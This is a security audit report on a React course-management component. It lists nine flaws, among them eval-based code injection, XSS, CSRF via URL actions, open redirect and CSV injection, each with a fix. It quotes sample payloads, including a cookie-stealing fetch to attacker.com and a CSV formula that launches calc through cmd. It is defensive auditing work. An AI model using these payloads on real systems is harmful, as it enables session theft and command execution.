# Security Audit Report: CourseManagementPanel

This report identifies security vulnerabilities and logic bugs in the `CourseManagementPanel` component.

## Identified Vulnerabilities

### 1. Broken Access Control (Privilege Escalation)
- **Code:** Lines 347-352 (Reading role from URL param).
- **Attack Vector:** An attacker can append `?role=admin` to the URL to gain administrative privileges in the UI, enabling buttons and actions meant only for admins.
- **Fix:** Remove client-side role determination from URL. Role must be derived from a secure, server-verified JWT/session.

### 2. Client-Side Execution of Sensitive Actions (CSRF/Link Injection)
- **Code:** Lines 355-362 (Auto-executing actions from URL on mount).
- **Attack Vector:** An attacker can trick an admin into clicking a link like `admin.com?action=delete&course_id=c-001`. The component will automatically delete the course without user confirmation.
- **Fix:** Remove auto-execution from URL. Require explicit user interaction (button click) and confirmation for sensitive actions.

### 3. Remote Code Execution (RCE) via `eval()`
- **Code:** Line 400 (`eval(formula)`).
- **Attack Vector:** A user can input a malicious formula like `(1); fetch('http://attacker.com?c=' + document.cookie)`. `eval()` will execute this arbitrary JavaScript in the context of the admin's session.
- **Fix:** Use a safe math parser library or a restricted white-list based calculation logic. Never use `eval()` on user-provided strings.

### 4. Cross-Site Scripting (XSS) via `dangerouslySetInnerHTML`
- **Code:** Lines 488, 494, 516.
- **Attack Vector:** Courses with malicious titles or descriptions (like the example in `MOCK_COURSES`) will execute scripts when rendered. An attacker could steal session tokens or perform actions on behalf of the admin.
- **Fix:** Sanitize HTML using a library like `DOMPurify` before rendering, or better, avoid `dangerouslySetInnerHTML` and use standard text rendering.

### 5. Open Redirect
- **Code:** Line 476 (`window.location.href = returnUrl`).
- **Attack Vector:** An attacker can provide a `return` URL pointing to a phishing site (`?return=https://malicious.com`). After the admin performs an action, they are redirected to the attacker's site.
- **Fix:** Validate the `returnUrl` against a whitelist of allowed domains or only allow relative paths.

### 6. Side Effects in `useMemo`
- **Code:** Lines 410-413 (Fetch call inside `useMemo`).
- **Attack Vector:** `useMemo` is not guaranteed to run only when dependencies change (React may drop it for performance). This leads to inconsistent and multiple tracking calls.
- **Fix:** Move the analytics tracking `fetch` call to a `useEffect` hook.

### 7. Broken Authentication on Polling
- **Code:** Line 378 (Missing Authorization header in polling request).
- **Effect:** The polling request will likely fail if the server requires authentication (which it should), or it exposes the API if it's unintentionally left open.
- **Fix:** Include the `Authorization` header in all API requests.

### 8. Trusting Client-Provided Metadata
- **Code:** Lines 426, 456 (`updatedBy: userRole`).
- **Attack Vector:** An attacker can intercept the request and change `updatedBy` to any other user. The server should never trust the client to identify the current user.
- **Fix:** The server should identify the user and their role from the Authorization token.

### 9. CSV Injection
- **Code:** Line 463 (Exporting raw data to CSV).
- **Attack Vector:** If a student's name is `=SUM(1+1)*cmd|' /C calc'!A0`, it could execute commands on a user's machine when they open the CSV in Excel.
- **Fix:** Escape fields starting with `=`, `+`, `-`, or `@` by prefixing them with a single quote.

## Defense-in-Depth Mitigations
1. **Server-Side Validation:** The backend must independently verify roles and permissions for every request, regardless of what the frontend sends.
2. **CSP (Content Security Policy):** Implement a strict CSP to prevent execution of inline scripts and restrict where scripts can be loaded from.
3. **HTTP-Only Cookies:** Store sensitive tokens in HTTP-only cookies to prevent access via JavaScript (mitigates XSS impact).
4. **Input Sanitization at Entry:** Sanitize all user input on the server before storing it in the database.
